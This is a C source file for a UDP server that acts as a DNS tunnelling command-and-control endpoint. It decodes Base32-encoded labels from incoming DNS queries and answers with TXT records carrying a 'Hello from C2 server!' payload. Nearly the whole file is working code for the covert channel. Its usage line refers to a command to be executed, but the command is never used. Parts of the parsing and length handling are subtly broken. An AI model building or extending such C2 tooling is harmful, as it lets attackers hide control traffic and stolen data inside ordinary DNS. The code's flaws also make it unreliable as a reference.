#include "server.h"
#define PORT 8053

int init_socket(struct sockaddr_in *server_addr)
{
    // Create socket
    int server_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (server_fd == -1)
    {
        perror("socket creation failed");
        return -1;
    }

    // Bind socket to the address
    int bind_result = bind(server_fd, (const struct sockaddr *)server_addr, sizeof(*server_addr));
    if (bind_result == -1)
    {
        perror("bind failed");
        if (server_fd)
            close(server_fd);
        return -1;
    }

    return server_fd;
}

// int determine_query_type

int main(int argc, char *argv[])
{

    if (argc < 2)
    {
        fprintf(stderr, "Usage: %s [command to be executed]\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in server_addr = {0};
    server_addr.sin_family = AF_INET;         // IPv4
    server_addr.sin_addr.s_addr = INADDR_ANY; // Listen on all interfaces
    server_addr.sin_port = htons(PORT);

    int server_fd = init_socket(&server_addr);
    if (server_fd == -1)
    {
        exit(EXIT_FAILURE);
    }

    // Server loop, waiting for incoming messages
    while (1)
    {
        char response_buffer[1024] = {0};

        struct sockaddr_in client_addr;
        socklen_t client_addr_len = sizeof(client_addr);

        printf("Waiting for incoming messages on port %d...\n", PORT);
        ssize_t recv_len = recvfrom(server_fd, response_buffer, sizeof(response_buffer) - 1, 0,
                                    (struct sockaddr *)&client_addr, &client_addr_len);
        if (recv_len > 0)
        {
            response_buffer[recv_len] = '\0'; // Null-terminate the received data
            struct dns_header *header = (struct dns_header *)response_buffer;

            printf("Received message from client:\n");

            char domain_name[256] = {0};
            domain_name[0] = '\0';
            int bytes_read = parse_domain_name(response_buffer, domain_name, sizeof(domain_name));

            char *question_type_ptr = (char *)response_buffer + sizeof(struct dns_header) + strlen(domain_name) + 2; // +2 for null byte and length byte
            uint16_t question_type = ntohs(*(uint16_t *)question_type_ptr);

            if (bytes_read > 0)
            {
                printf("    Parsed domain name: %s\n", domain_name);
            }
            else
            {
                perror("    Failed to parse domain name");
            }

            char *encoded_part = strchr(domain_name, '.');
            if (encoded_part)
            {
                *encoded_part = '\0';       // End string after encoded part
                encoded_part = domain_name; // Point to the encoded part

                // Add missing Base32 '=' padding
                size_t enc_len = strlen(encoded_part);
                size_t pad_len = (8 - (enc_len % 8)) % 8;
                for (size_t i = 0; i < pad_len; i++)
                {
                    encoded_part[enc_len + i] = '=';
                }
                encoded_part[enc_len + pad_len] = '\0';

                char decoded_command[256] = {0};
                size_t decoded_len = sizeof(decoded_command);
                base32_decode(encoded_part, strlen(encoded_part), decoded_command, &decoded_len);

                printf("    DNS Type: %s\n", (question_type == 1) ? "A" : (question_type == 16) ? "TXT"
                                                                                                : "Other");
                printf("    Decoded text: %s\n", decoded_command);
            }

            send_response("Hello from C2 server!", server_fd, header, &client_addr, client_addr_len, recv_len);
        }
        else if (recv_len == -1)
        {
            perror("recvfrom failed");
        }
    }
}

int send_response(const char *payload, int server_fd, struct dns_header *recv_header, struct sockaddr_in *client_addr, socklen_t client_addr_len, ssize_t received_bytes)
{
    char packet[512] = {0};
    int packet_offset = 0;

    struct dns_header response_header = {0};
    response_header.id = recv_header->id;
    response_header.flags = htons(0x8180);
    response_header.qdcount = htons(1); // Echo back the question count
    response_header.ans_count = htons(1);

    // Copy the header to the packet buffer
    void *result = memcpy(packet + packet_offset, &response_header, sizeof(response_header));
    if (result == NULL)
    {
        fprintf(stderr, "Failed to copy response header to packet buffer\n");
        return -1;
    }
    packet_offset += sizeof(response_header);

    // Parse question part, echo it back in the request.
    int question_len = 0;
    if (received_bytes > (ssize_t)sizeof(struct dns_header))
    {
        char *question_ptr = (char *)recv_header + sizeof(struct dns_header);
        while (question_ptr[question_len] != 0)
        {
            question_len++;
        }

        question_len += 5; // Account for the null byte and QTYPE/QCLASS
    }

    result = memcpy(packet + packet_offset, (char *)recv_header + sizeof(struct dns_header), question_len);
    if (result == NULL)
    {
        fprintf(stderr, "Failed to copy question section to packet buffer\n");
        return -1;
    }
    packet_offset += question_len;

    int answer_len = format_answer(payload, packet + packet_offset);
    packet_offset += answer_len;

    ssize_t sent_len = sendto(server_fd, packet, packet_offset, 0,
                              (const struct sockaddr *)client_addr, client_addr_len);
    if (sent_len == -1)
    {
        perror("sendto failed");
        return -1;
    }
    return 0;
}

int format_answer(const char *payload, char *buffer)
{
    struct dns_answer answer = {0};
    answer.name = htons(0xC00C); // Use the same domain from the question section
    answer.type = htons(16);     // TXT record
    answer.class = htons(1);
    answer.ttl = htonl(300); // Set TTL to 300 seconds

    answer.rdlength = htons(strlen(payload) + 1); // +1 for the length byte

    char *rdata_ptr = (char *)&answer.rdata; // Point to the rdata field
    // Transform the payload into a length-prefixed format for TXT records
    size_t payload_len = strlen(payload);
    if (payload_len > 255)
    {
        fprintf(stderr, "Payload too long for TXT record\n");
        return -1;
    }
    rdata_ptr[0] = (char)payload_len;                           // Length byte
    void *result = memcpy(rdata_ptr + 1, payload, payload_len); // Copy the payload after the length byte
    if (result == NULL)
    {
        fprintf(stderr, "Failed to copy payload to rdata field\n");
        return -1;
    }
    result = memcpy(buffer, &answer, sizeof(answer) - (sizeof(answer.rdata) - payload_len - 1)); // Copy the answer structure without the unused rdata space
    if (result == NULL)
    {
        fprintf(stderr, "Failed to copy answer structure to packet buffer\n");
        return -1;
    }
    return sizeof(answer) + payload_len + 1; // Total length of the answer record
}

int parse_domain_name(const char *buffer, char *domain_name, int max_len)
{
    int offset = sizeof(struct dns_header);
    unsigned char *start = (unsigned char *)buffer + offset;
    unsigned char *reader = start;
    int section_len = *reader;
    int domain_name_len = 0;
    while (section_len > 0)
    {
        reader++;
        if (domain_name_len + section_len >= max_len)
        {
            fprintf(stderr, "Domain name too long\n");
            return -1;
        }
        strncat(domain_name, (char *)reader, section_len);
        domain_name_len += section_len;
        reader += section_len;
        if (*reader != 0)
        {
            domain_name[domain_name_len] = '.';
            domain_name[domain_name_len + 1] = '\0';
            domain_name_len++;
        }
        section_len = *reader;
    }
    int bytes_read = (reader - start) + 1; // +1 for the null byte
    return bytes_read;
}